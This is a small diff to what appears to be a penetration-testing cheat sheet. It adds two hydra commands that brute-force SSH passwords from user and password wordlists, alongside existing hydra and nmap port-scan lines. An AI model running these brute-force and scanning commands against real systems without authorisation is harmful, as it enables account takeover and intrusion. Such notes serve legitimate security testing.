@@ -13,6 +13,10 @@ hydra -l frjb -P /usr/share/wordlists/metasploit/unix_passwords.txt -u -s 22 IP_
 hydra -l <username> -P <path/to/wordlist.txt> ssh://<target_ip_address>
 
 
+hydra -L users.txt -P passwords.txt 192.168.1.100 ssh -s 22
+
+hydra -L frjb -P /usr/share/wordlists/metasploit/unix_passwords.txt IP_ADDRESS ssh -s 22
+
 nmap IP_ADDRESS_TO_SCAN -p 22,25,53,80,111,443,445,1433,27017,3306,3389,2049 --open
 
 nmap -A IP_ADDRESS_TO_SCAN -p 22,25,53,80,111,443,445,2049,3389 --open
